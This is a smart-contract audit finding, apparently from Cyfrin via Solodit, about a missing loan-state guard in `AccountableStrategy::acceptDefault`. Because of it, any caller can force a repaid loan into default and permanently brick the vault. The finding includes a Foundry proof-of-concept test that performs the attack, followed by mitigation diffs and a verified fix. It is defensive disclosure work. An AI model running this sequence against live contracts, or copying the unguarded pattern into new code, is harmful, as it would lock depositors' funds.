---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2026-06-30-cyfrin-accountable-pr75-v2-0-0-3
ingested_at: '2026-08-16T05:02:10Z'
protocol_category: []
published_at: '2026-06-30T00:00:00Z'
related_swc: []
severity: Medium
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-30-cyfrin-accountable-pr75-v2.0.md
tags:
- firm:cyfrin
- report:2026-06-30-cyfrin-accountable-pr75-v2-0
title: '`AccountableStrategy::acceptDefault` has no loan-state guard, letting a fully
  repaid loan be forced into `InDefault` and bricking the vault'
vuln_class: []
---

# `AccountableStrategy::acceptDefault` has no loan-state guard, letting a fully repaid loan be forced into `InDefault` and bricking the vault

_Section severity (from Solodit section header): Medium_  
_Audit firm: Cyfrin_  
_Source report: [2026-06-30-cyfrin-accountable-pr75-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-30-cyfrin-accountable-pr75-v2.0.md)_

---

**Description:** `acceptDefault` contains only a timelock check and no guard on the current `loanState` (and is `external` with no access modifier, so any caller can invoke it):

```solidity
function acceptDefault() external {
    if (block.timestamp < _defaultValidAt || _defaultValidAt == 0) revert TimelockNotExpired();
    loanState = LoanState.InDefault;
    emit LoanDefaulted(_loan.outstandingPrincipal, IAccountableVault(vault).totalAssets());
}
```

`defaultLoan` arms the timelock and leaves `loanState` unchanged:

```solidity
function defaultLoan() external onlySafetyModuleOrManager {
    _requireLoanOngoing();
    if (_defaultValidAt != 0) revert DefaultAlreadyPending();
    _defaultValidAt = block.timestamp + 1 days;
    emit LoanDefaultInitiated();
}
```

If the borrower then repays in full before the timelock expires, `repay` transitions the loan to `Repaid` but never clears `_defaultValidAt`:

```solidity
if (_loan.outstandingPrincipal == 0 && accruedPenalties == 0 && deployedAssets == 0) {
    loanState = LoanState.Repaid;
}
```

The only function that clears `_defaultValidAt` is `rejectDefault`:

```solidity
function rejectDefault() external onlyManager {
    _defaultValidAt = 0;
    emit LoanDefaultRejected();
}
```

So once the 1-day timelock elapses, any caller can invoke `acceptDefault`, which unconditionally overwrites `loanState` from `Repaid` to `InDefault`. This corrupts the loan state machine: from `InDefault` the only forward move is `coverDefault`, which sinks the loan into `InDefaultClaims`, and there is no transition back to an ongoing state. `borrow`, `repay`, `publishRate`, deposits, and queue processing all gate on `_requireLoanOngoing()` and revert permanently.

**Impact:** Any unprivileged caller can permanently brick the vault by forcing a fully repaid loan into a terminal default state (where `borrow`, `repay`, deposits, NAV publishing, and queue processing all revert with no recovery path) whenever a default was initiated and the manager did not call `rejectDefault` before the borrower's pre-timelock repayment, a sequence an attacker can engineer by timing the repayment just before the deadline.

**Proof of Concept:** alice deposits 100,000 USDC, the borrower draws it all, the manager initiates a default, the borrower repays in full (driving `loanState` to `Repaid`), and after the timelock an arbitrary attacker calls `acceptDefault` and forces `InDefault`.

Add the following test to `test/strategies/PoC_RepaidForcedDefault.t.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./AccountableStrategyBase.t.sol";

contract PoC_RepaidForcedDefault is AccountableStrategyBaseTest {
    function _setupYieldLoan() internal {
        vm.prank(manager);
        usdcYieldLoan.setPendingBorrower(borrower);
        vm.prank(borrower);
        usdcYieldLoan.acceptBorrowerRole();
        vm.prank(manager);
        usdcYieldLoan.setOperationsAdminEnabled(true);
        address operationsAdmin = globals.operationsAdmin();
        vm.prank(operationsAdmin);
        usdcYieldLoan.setDVNPublisher(navOracle);

        LoanTerms memory terms = LoanTerms({
            minDeposit: 0, minRedeem: 0, maxCapacity: USDC_AMOUNT * 10, minCapacity: 0,
            interestRate: 0, interestInterval: 30 days, duration: 0, depositPeriod: 0,
            acceptGracePeriod: 0, lateInterestGracePeriod: 2 days, lateInterestPenalty: 5e2,
            withdrawalPeriod: 0
        });
        vm.prank(manager);
        usdcYieldLoan.setTerms(terms);
        vm.prank(borrower);
        usdcYieldLoan.acceptTerms();
    }

    function test_RepaidLoanCanBeForcedIntoDefault() public {
        vm.warp(1739893670);
        _setupYieldLoan();

        uint256 depositAmount = 100_000 * 10 ** USDC_DECIMALS;
        vm.prank(alice);
        usdcYieldVault.deposit(depositAmount, alice, alice);
        vm.prank(borrower);
        usdcYieldLoan.borrow(depositAmount);
        assertEq(uint8(usdcYieldLoan.loanState()), uint8(LoanState.OngoingDynamic));

        // Manager initiates default: only arms _defaultValidAt = now + 1 days.
        vm.prank(manager);
        usdcYieldLoan.defaultLoan();

        // Timelock genuinely pending.
        vm.expectRevert(TimelockNotExpired.selector);
        usdcYieldLoan.acceptDefault();

        // Borrower repays IN FULL before the timelock -> Repaid, but _defaultValidAt is NOT cleared.
        vm.prank(borrower);
        usdcYieldLoan.repay(depositAmount);
        assertEq(uint8(usdcYieldLoan.loanState()), uint8(LoanState.Repaid));
        assertEq(usdcYieldLoan.loan().outstandingPrincipal, 0);
        assertEq(usdcYieldLoan.accruedPenalties(), 0);
        assertEq(usdcYieldLoan.deployedAssets(), 0);

        // Manager forgot rejectDefault(); timelock elapses.
        vm.warp(block.timestamp + 1 days + 1);

        // BUG: an arbitrary caller forces Repaid -> InDefault.
        vm.prank(address(0xBADBADBAD));
        usdcYieldLoan.acceptDefault();
        assertEq(uint8(usdcYieldLoan.loanState()), uint8(LoanState.InDefault));

        // Vault is bricked: ongoing-gated operations revert.
        vm.prank(borrower);
        vm.expectRevert(LoanNotOngoing.selector);
        usdcYieldLoan.borrow(1);

        // coverDefault sinks it into InDefaultClaims with no recovery path.
        vm.prank(manager);
        usdcYieldLoan.coverDefault(0);
        assertEq(uint8(usdcYieldLoan.loanState()), uint8(LoanState.InDefaultClaims));
    }
}
```

Run with: `forge test --match-test test_RepaidLoanCanBeForcedIntoDefault -vv`

Output:

```
Ran 1 test for test/strategies/PoC_RepaidForcedDefault.t.sol:PoC_RepaidForcedDefault
[PASS] test_RepaidLoanCanBeForcedIntoDefault() (gas: 786153)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.37s
```

**Recommended Mitigation:** Guard `acceptDefault` on the loan state, and clear the pending timer when the loan reaches `Repaid`:

```diff
 function acceptDefault() external {
     if (block.timestamp < _defaultValidAt || _defaultValidAt == 0) revert TimelockNotExpired();
+    _requireLoanOngoing(); // a repaid loan is no longer default-eligible
     loanState = LoanState.InDefault;
     ...
 }
```

```diff
 if (_loan.outstandingPrincipal == 0 && accruedPenalties == 0 && deployedAssets == 0) {
     loanState = LoanState.Repaid;
+    _defaultValidAt = 0; // cancel any pending default so it cannot be accepted later
 }
```

**Accountable:** Fixed in commit [`22bf5d5`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/22bf5d58fc104094375b82ac7e39aac3ce6dd12b)

**Cyfrin:** Verified. `acceptDefault` now reverts `LoanNotOngoing` for a non-ongoing loan, and `_defaultValidAt` is cleared on the `Repaid` transition so a repaid loan can no longer be forced into `InDefault`.


\clearpage
